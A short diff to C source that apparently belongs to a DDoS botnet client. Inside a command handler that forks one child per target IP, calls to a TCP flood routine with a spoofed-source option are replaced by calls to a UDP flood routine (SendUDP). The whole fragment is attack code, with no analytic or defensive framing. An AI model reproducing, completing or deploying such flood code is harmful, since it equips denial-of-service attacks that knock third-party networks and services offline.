@@ -902,14 +902,14 @@ void processCmd(int argc, unsigned char *argv[]) {
                 unsigned char *hi = strtok(ip, ",");
                 while(hi != NULL){
                     if(!listFork()){
-                        rtcp(hi, port, time, spoofed, psize, pollinterval);
+                        SendUDP(hi, port, time, spoofed, psize, pollinterval);
                         _exit(0);
                     }
                     hi = strtok(NULL, ",");
                 }
             } else {
                 if (listFork()) { return; }
-                rtcp(ip, port, time, spoofed, psize, pollinterval);
+                SendUDP(ip, port, time, spoofed, psize, pollinterval);
                 _exit(0);
             }
         }
